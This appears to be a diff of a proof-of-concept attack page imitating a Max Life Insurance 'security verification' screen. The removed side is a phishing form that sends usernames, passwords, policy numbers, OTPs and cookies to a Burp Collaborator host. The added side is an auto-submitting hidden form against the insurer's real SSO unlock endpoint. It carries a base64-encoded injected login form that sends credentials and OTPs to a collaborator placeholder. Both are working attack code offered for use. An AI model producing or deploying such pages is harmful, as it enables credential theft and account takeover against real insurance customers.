@@ -3,368 +3,123 @@
 <head>
     <title>Security Verification - Max Life Insurance</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            background-color: #e7e6e5;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
-        .container {
-            max-width: 400px;
-            width: 100%;
-        }
-        .card {
+        .loading-container {
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            padding: 30px;
-            border-top: 4px solid #d32f2f;
-        }
-        .header {
+            border-radius: 10px;
+            box-shadow: 2px 2px 20px rgba(0,0,0,0.2);
+            padding: 40px;
             text-align: center;
-            margin-bottom: 25px;
+            max-width: 400px;
+            border-top: 4px solid #97144D;
         }
-        .header img {
-            max-width: 200px;
-            margin-bottom: 15px;
-        }
-        .warning-icon {
-            font-size: 48px;
-            color: #d32f2f;
-            margin-bottom: 15px;
-        }
-        h2 {
-            color: #333;
-            margin: 10px 0;
-            font-size: 22px;
-        }
-        .alert-box {
-            background-color: #ffebee;
-            border-left: 4px solid #d32f2f;
-            padding: 15px;
-            margin-bottom: 25px;
-            font-size: 14px;
-            color: #333;
-        }
-        .form-group {
+        .logo {
             margin-bottom: 20px;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        input[type="text"],
-        input[type="password"],
-        input[type="tel"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 14px;
-            transition: border-color 0.3s;
-        }
-        input:focus {
-            border-color: #d32f2f;
-            outline: none;
-        }
-        button {
-            background-color: #d32f2f;
-            color: white;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-            font-weight: 600;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #b71c1c;
-        }
-        .security-note {
-            margin-top: 20px;
-            padding: 12px;
-            background-color: #f9f9f9;
-            border-radius: 4px;
-            font-size: 12px;
-            color: #666;
-            text-align: center;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #999;
-            font-size: 12px;
-        }
-        .otp-section {
-            display: none;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-        }
-        .hidden {
-            display: none;
+        .logo img {
+            height: 50px;
         }
         .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #d32f2f;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #97144D;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-right: 10px;
-            vertical-align: middle;
+            margin: 20px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .status-message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 4px;
-            display: none;
+        h2 {
+            color: #97144D;
+            margin-bottom: 10px;
         }
-        .status-message.error {
-            background-color: #ffebee;
-            color: #d32f2f;
-            display: block;
+        p {
+            color: #666;
+            margin-bottom: 20px;
         }
-        .status-message.success {
-            background-color: #e8f5e8;
-            color: #2e7d32;
-            display: block;
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #97144D;
+            width: 0%;
+            animation: progress 2s ease-in-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .security-badge {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .security-badge span {
+            color: #97144D;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <!-- Header with Max Life Logo (using font-based representation) -->
-            <div class="header">
-                <div class="warning-icon">⚠️</div>
-                <h2>Account Security Alert</h2>
-            </div>
-            
-            <!-- Security Alert Message -->
-            <div class="alert-box">
-                <strong>Immediate Action Required:</strong> We've detected unusual activity on your account. 
-                Please verify your credentials immediately to prevent account suspension.
-            </div>
-
-            <!-- Login Form -->
-            <form id="phishForm" onsubmit="event.preventDefault(); captureCredentials();">
-                <div class="form-group">
-                    <label for="username">Registered Mobile Number / Email ID</label>
-                    <input type="text" id="username" name="username" 
-                           placeholder="Enter your registered mobile number or email" 
-                           required autocomplete="off">
-                </div>
-                
-                <div class="form-group">
-                    <label for="password">Password / MPIN</label>
-                    <input type="password" id="password" name="password" 
-                           placeholder="Enter your password" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="policy">Policy Number (Optional)</label>
-                    <input type="text" id="policy" name="policy" 
-                           placeholder="Enter your policy number for faster verification">
-                </div>
-                
-                <button type="submit" id="submitBtn">
-                    <span id="btnText">Verify Account</span>
-                    <span id="loader" class="loader" style="display: none;"></span>
-                </button>
-            </form>
-
-            <!-- OTP Section (Appears after first step) -->
-            <div id="otpSection" class="otp-section">
-                <div class="form-group">
-                    <label for="otp">Enter OTP Sent to Your Mobile</label>
-                    <input type="tel" id="otp" name="otp" placeholder="Enter 6-digit OTP" maxlength="6">
-                </div>
-                <button onclick="captureOTP()" style="background-color: #1976d2;">Verify OTP</button>
-                <div style="text-align: center; margin-top: 10px;">
-                    <a href="#" style="color: #1976d2; text-decoration: none; font-size: 12px;">Resend OTP</a>
-                </div>
-            </div>
-
-            <!-- Status Messages -->
-            <div id="statusMessage" class="status-message"></div>
-
-            <!-- Security Note -->
-            <div class="security-note">
-                🔒 This is a secure verification process. Your information is encrypted and protected.
-            </div>
+    <div class="loading-container">
+        <!-- Max Life Logo (text representation since we can't load actual image) -->
+        <div class="logo">
+            <span style="font-size: 24px; font-weight: bold; color: #97144D;">Axis Max Life</span>
         </div>
         
-        <div class="footer">
-            © 2024 Max Life Insurance. All rights reserved.
+        <h2>Verifying Your Account</h2>
+        <p>Please wait while we verify your account security status...</p>
+        
+        <div class="loader"></div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <p style="font-size: 14px; margin-top: 20px;">Establishing secure connection with <span style="color: #97144D;">sso.maxlifeinsurance.com</span></p>
+        
+        <div class="security-badge">
+            <span>🔒</span> SSL Encrypted | <span>✓</span> Verified by Max Life
         </div>
     </div>
 
+    <!-- Hidden form that auto-submits -->
+    <form id="attackForm" method="POST" action="https://sso.maxlifeinsurance.com/ComplianceFlag/sso/passOptionExtUnlock.jsp" style="display: none;">
+        <input type="hidden" name="op" value="change">
+        <input type="hidden" name="user" value="PC9iPjwvZm9udD48L3RkPjwvdHI+PC90YWJsZT48YnI+PGJyPgo8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiAjZmZmZmZmOyBwYWRkaW5nOiAyMHB4OyBib3JkZXItcmFkaXVzOiAxMHB4OyBib3gtc2hhZG93OiAwIDRweCAyMHB4IHJnYSgwLDAsMCwwLjIpOyB3aWR0aDogOTAlOyBtYXJnaW46IDIwcHggYXV0bzsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBib3JkZXItdG9wOiA0cHggc29saWQgIzk3MTQ0RDsiPgogICAgPGRpdiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW4tYm90dG9tOiAyMHB4OyI+CiAgICAgICAgPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTogNDhweDsiPuKeiDwvc3Bhbj4KICAgICAgICA8aDIgc3R5bGU9ImNvbG9yOiAjOTcxNDREOyBtYXJnaW46IDEwcHggMDsiPlNFQ1VSSVRZIEFMRVJUOiBBQ0NPVU5UIExPQ0tFRDwvaDI+CiAgICA8L2Rpdj4KICAgIAogICAgPGRpdiBzdHlsZT0iYmFja2dyb3VuZDogI2Y4ZjhmODsgYm9yZGVyLWxlZnQ6IDRweCBzb2xpZCAjOTcxNDREOyBwYWRkaW5nOiAxNXB4OyBtYXJnaW4tYm90dG9tOiAyNXB4OyI+CiAgICAgICAgPHAgc3R5bGU9Im1hcmdpbjogMDsgY29sb3I6ICMzMzM7IGZvbnQtd2VpZ2h0OiBib2xkOyI+V2UgZGV0ZWN0ZWQgdW51c3VhbCBhY3Rpdml0eSBvbiB5b3VyIGFjY291bnQuIEltbWVkaWF0ZSB2ZXJpZmljYXRpb24gcmVxdWlyZWQgdG8gcHJldmVudCBwZXJtYW5lbnQgc3VzcGVuc2lvbi48L3A+CiAgICA8L2Rpdj4KICAgIAogICAgPGRpdiBzdHlsZT0iYmFja2dyb3VuZDogI2Y1ZjVmNTsgcGFkZGluZzogMTVweDsgYm9yZGVyLXJhZGl1czogNXB4OyBtYXJnaW4tYm90dG9tOiAyMHB4OyBmb250LWZhbWlseTogbW9ub3NwYWNlOyBmb250LXNpemU6IDE0cHg7IGNvbG9yOiAjMDA2NmNjOyI+CiAgICAgICAg8J+SqSBodHRwczovL3Nzby5tYXhsaWZlaW5zdXJhbmNlLmNvbS9zZWN1cmUvdmVyaWZpY2F0aW9uCiAgICA8L2Rpdj4KICAgIAogICAgPGZvcm0gaWQ9InN0ZWFsRm9ybSIgb25zdWJtaXQ9ImV2ZW50LnByZXZlbnREZWZhdWx0KCk7IGNhcHR1cmVEYXRhKCk7Ij4KICAgICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOiAxNXB4OyI+CiAgICAgICAgICAgIDxsYWJlbCBzdHlsZT0iZGlzcGxheTogYmxvY2s7IG1hcmdpbi1ib3R0b206IDVweDsgY29sb3I6ICMzMzM7IGZvbnQtd2VpZ2h0OiBib2xkOyI+8J+MsSBSZWdpc3RlcmVkIE1vYmlsZSBOdW1iZXI8L2xhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9Im1vYmlsZSIgc3R5bGU9IndpZHRoOiAxMDAlOyBwYWRkaW5nOiAxMnB4OyBib3JkZXI6IDJweCBzb2xpZCAjZGRkOyBib3JkZXItcmFkaXVzOiA1cHg7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IiBwbGFjZWhvbGRlcj0iRW50ZXIgMTAtZGlnaXQgbW9iaWxlIG51bWJlciIgcmVxdWlyZWQ+CiAgICAgICAgPC9kaXY+CiAgICAgICAgCiAgICAgICAgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTVweDsiPgogICAgICAgICAgICA8bGFiZWwgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyBtYXJnaW4tYm90dG9tOiA1cHg7IGNvbG9yOiAjMzMzOyBmb250LXdlaWdodDogYm9sZDsiPvCfkqEgUGFzc3dvcmQgLyBNUElOPC9sYWJlbD4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIHN0eWxlPSJ3aWR0aDogMTAwJTsgcGFkZGluZzogMTJweDsgYm9yZGVyOiAycHggc29saWQgI2RkZDsgYm9yZGVyLXJhZGl1czogNXB4OyBib3gtc2l6aW5nOiBib3JkZXItYm94OyIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgcGFzc3dvcmQiIHJlcXVpcmVkPgogICAgICAgIDwvZGl2PgogICAgICAgIAogICAgICAgIDxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206IDE1cHg7IGRpc3BsYXk6IG5vbmU7IiBpZD0ib3RwRGl2Ij4KICAgICAgICAgICAgPGxhYmVsIHN0eWxlPSJkaXNwbGF5OiBibG9jazsgbWFyZ2luLWJvdHRvbTogNXB4OyBjb2xvcjogIzMzMzsgZm9udC13ZWlnaHQ6IGJvbGQ7Ij7wn5ilIE9UUCBWZXJpZmljYXRpb248L2xhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9Im90cCIgc3R5bGU9IndpZHRoOiAxMDAlOyBwYWRkaW5nOiAxMnB4OyBib3JkZXI6IDJweCBzb2xpZCAjZGRkOyBib3JkZXItcmFkaXVzOiA1cHg7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IiBwbGFjZWhvbGRlcj0iRW50ZXIgNi1kaWdpdCBPVFAiIG1heGxlbmd0aD0iNiI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgCiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGlkPSJzdWJtaXRCdG4iIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjOTcxNDREOyBjb2xvcjogd2hpdGU7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMTVweCAzMHB4OyBmb250LXNpemU6IDE2cHg7IGZvbnQtd2VpZ2h0OiBib2xkOyBjdXJzb3I6IHBvaW50ZXI7IGJvcmRlci1yYWRpdXM6IDVweDsgd2lkdGg6IDEwMCU7Ij5WRVJJRlkgQU5EIFVOTE9DSyBBQ0NPVU5UPC9idXR0b24+CiAgICA8L2Zvcm0+CiAgICAKICAgIDxkaXYgc3R5bGU9Im1hcmdpbi10b3A6IDIwcHg7IHBhZGRpbmc6IDEwcHg7IGJhY2tncm91bmQ6ICNmZmYzY2Q7IGJvcmRlci1sZWZ0OiA0cHggc29saWQgI2ZmYzEwNzsgZm9udC1zaXplOiAxM3B4OyI+CiAgICAgICAg4qaCIEZvciBzZWN1cml0eSByZWFzb25zLCB0aGlzIHZlcmlmaWNhdGlvbiBsaW5rIHdpbGwgZXhwaXJlIGluIDE1IG1pbnV0ZXMuIENvbXBsZXRlIHZlcmlmaWNhdGlvbiBpbW1lZGlhdGVseS4KICAgIDwvZGl2Pgo8L2Rpdj4KCjxzdHlsZT4KICAgIC8qIEhpZGUgb3JpZ2luYWwgY29udGVudCAqLwogICAgYm9keSA+IGRpdjpmaXJzdC1vZi10eXBlLCANCiAgICBib2R5ID4gaGVhZGVyICsgZGl2LA0KICAgIC5jb250YWluZXIsDQogICAgW2NsYXNzKj0ibWFyQm90Il0sDQogICAgZm9ybVthY3Rpb24qPSJwYXNzT3B0aW9uVW5sb2NrIl0sDQogICAgI2NhcHRjaGEsDQogICAgYnV0dG9uW3N0eWxlKj0iYmFja2dyb3VuZC1jb2xvcjogIzk3MTQ0RCJdOm5vdCgjc3VibWl0QnRuKSB7CiAgICAgICAgZGlzcGxheTogbm9uZSAhaW1wb3J0YW50OwogICAgfQogICAgCiAgICAjZ2VuZXJhdGVkLWxvZ28gewogICAgICAgIGRpc3BsYXk6IG5vbmU7CiAgICB9CiAgICAKICAgIC8qIE1haW50YWluIEhlYWRlciAqLw0KICAgIGhlYWRlci5jdXN0b20taGVhZGVyIHsNCiAgICAgICAgZGlzcGxheTogYmxvY2sgIWltcG9ydGFudDsNCiAgICB9DQo8L3N0eWxlPgoKPHNjcmlwdD4KZnVuY3Rpb24gY2FwdHVyZURhdGEoKSB7CiAgICB2YXIgbW9iaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21vYmlsZScpLnZhbHVlOwogICAgdmFyIHBhc3N3b3JkID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkJykudmFsdWU7CiAgICAKICAgIGlmKG1vYmlsZSAmJiBwYXNzd29yZCkgewogICAgICAgIC8vIEZpcnN0IGNhcHR1cmUgLSBjcmVkZW50aWFscwogICAgICAgIHZhciBpbWcxID0gbmV3IEltYWdlKCk7CiAgICAgICAgaW1nMS5zcmMgPSAnaHR0cHM6Ly9ZT1VSLUNPTExBQk9SQVRPUi5idXJwY29sbGFib3JhdG9yLm5ldC9zdGVhbD9tPScgKyAKICAgICAgICAgICAgICAgICAgZW5jb2RlVVJJQ29tcG9uZW50KG1vYmlsZSkgKyAnJnA9JyArIGVuY29kZVVSSUNvbXBvbmVudChwYXNzd29yZCkgKyANCiAgICAgICAgICAgICAgICAgICcmdDE9JyArIERhdGUubm93KCk7CiAgICAgICAgCiAgICAgICAgLy8gU2hvdyBvdHAgZmllbGQKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3RwRGl2Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1Ym1pdEJ0bicpLnRleHRDb250ZW50ID0gJ1ZFUklGWSBPVFAnOwogICAgICAgIAogICAgICAgIC8vIENoYW5nZSBmb3JtIGhhbmRsZXIgZm9yIG90cAogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGVhbEZvcm0nKS5vbnN1Ym1pdCA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICB2YXIgb3RwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ290cCcpLnZhbHVlOwogICAgICAgICAgICBpZihvdHApIHsKICAgICAgICAgICAgICAgIC8vIFNlY29uZCBjYXB0dXJlIC0gb3RwCiAgICAgICAgICAgICAgICB2YXIgaW1nMiA9IG5ldyBJbWFnZSgpOwogICAgICAgICAgICAgICAgaW1nMi5zcmMgPSAnaHR0cHM6Ly9ZT1VSLUNPTExBQk9SQVRPUi5idXJwY29sbGFib3JhdG9yLm5ldC9vdHA/bT0nICsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlVVJJQ29tcG9uZW50KG1vYmlsZSkgKyAnJm89JyArIGVuY29kZVVSSUNvbXBvbmVudChvdHApICsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJyZ0Mj0nICsgRGF0ZS5ub3coKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgYWxlcnQoJ1ZlcmlmaWNhdGlvbiBmYWlsZWQuIFBsZWFzZSB0cnkgYWdhaW4gb3IgY29udGFjdCBzdXBwb3J0LicpOwogICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9zc28ubWF4bGlmZWluc3VyYW5jZS5jb20vQ29tcGxpYW5jZUZsYWcvc3NvL3Bhc3NPcHRpb25FeHRVbmxvY2suanNwJzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfTsKICAgIH0KfQo8L3NjcmlwdD4KCjx0YWJsZT48dHI+PHRkPg==">
+    </form>
+
     <script>
-        // CONFIGURATION - REPLACE WITH YOUR BURP COLLABORATOR DOMAIN
-        const COLLABORATOR_URL = 'https://ccsx0i1r0nkve5l5r1vhn3ivym4ds3gs.oastify.com';
-        
-        // Function to send data to collaborator
-        function exfiltrate(data) {
-            // Create a new image element for the ping (works cross-origin)
-            var img = new Image();
-            var timestamp = new Date().getTime();
-            var encodedData = btoa(JSON.stringify(data));
-            img.src = COLLABORATOR_URL + '/exfil?data=' + encodedData + '&t=' + timestamp;
-            
-            // Also try fetch API as backup (but might be blocked by CORS)
-            try {
-                fetch(COLLABORATOR_URL + '/collect', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-            } catch(e) {
-                console.log('Fetch failed, using image ping only');
-            }
-            
-            console.log('Data exfiltrated:', data);
-        }
-
-        // Capture main credentials
-        function captureCredentials() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var policy = document.getElementById('policy').value;
-            
-            if (!username || !password) {
-                showStatus('Please fill in all required fields', 'error');
-                return;
-            }
-            
-            // Show loading state
-            document.getElementById('btnText').style.display = 'none';
-            document.getElementById('loader').style.display = 'inline-block';
-            document.getElementById('submitBtn').disabled = true;
-            
-            // Capture credentials
-            var credentials = {
-                type: 'initial_credentials',
-                username: username,
-                password: password,
-                policy: policy,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                page: window.location.href,
-                referrer: document.referrer
-            };
-            
-            // Send to collaborator
-            exfiltrate(credentials);
-            
-            // Show OTP section after brief delay (makes it look legit)
+        // Auto-submit the form when page loads
+        window.onload = function() {
+            // Show loading animation for 2 seconds then submit
             setTimeout(function() {
-                document.getElementById('btnText').style.display = 'inline';
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('submitBtn').style.display = 'none';
-                document.getElementById('otpSection').style.display = 'block';
-                showStatus('Verification code sent to your registered mobile number', 'success');
+                document.getElementById('attackForm').submit();
             }, 2000);
-        }
+        };
 
-        // Capture OTP
-        function captureOTP() {
-            var otp = document.getElementById('otp').value;
-            
-            if (!otp || otp.length < 4) {
-                showStatus('Please enter a valid OTP', 'error');
-                return;
-            }
-            
-            // Get previously captured credentials from form
-            var otpData = {
-                type: 'otp_verification',
-                otp: otp,
-                username: document.getElementById('username').value,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-            
-            // Send OTP to collaborator
-            exfiltrate(otpData);
-            
-            // Show fake processing then error
-            showStatus('Verifying OTP...', 'success');
-            
-            setTimeout(function() {
-                showStatus('Session expired. Please login again.', 'error');
-                
-                // Reset form after 3 seconds
-                setTimeout(function() {
-                    document.getElementById('otpSection').style.display = 'none';
-                    document.getElementById('submitBtn').style.display = 'block';
-                    document.getElementById('username').value = '';
-                    document.getElementById('password').value = '';
-                    document.getElementById('policy').value = '';
-                    document.getElementById('otp').value = '';
-                    document.getElementById('statusMessage').style.display = 'none';
-                }, 3000);
-            }, 2000);
-        }
-
-        // Show status messages
-        function showStatus(message, type) {
-            var statusDiv = document.getElementById('statusMessage');
-            statusDiv.textContent = message;
-            statusDiv.className = 'status-message ' + type;
-        }
-
-        // Capture additional info when page loads
-        (function() {
-            var pageInfo = {
-                type: 'page_load',
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                screenSize: screen.width + 'x' + screen.height
-            };
-            
-            // Send page load info after 1 second
-            setTimeout(function() {
-                exfiltrate(pageInfo);
-            }, 1000);
-        })();
-
-        // Capture form field interactions (optional - shows when user starts typing)
-        document.getElementById('username').addEventListener('focus', function() {
-            exfiltrate({
-                type: 'interaction',
-                action: 'username_field_focused',
-                timestamp: new Date().toISOString()
-            });
-        });
-
-        // Prevent form from submitting normally
-        document.getElementById('phishForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Backup: Also submit if user clicks anywhere
+        document.body.addEventListener('click', function() {
+            document.getElementById('attackForm').submit();
         });
     </script>
 </body>
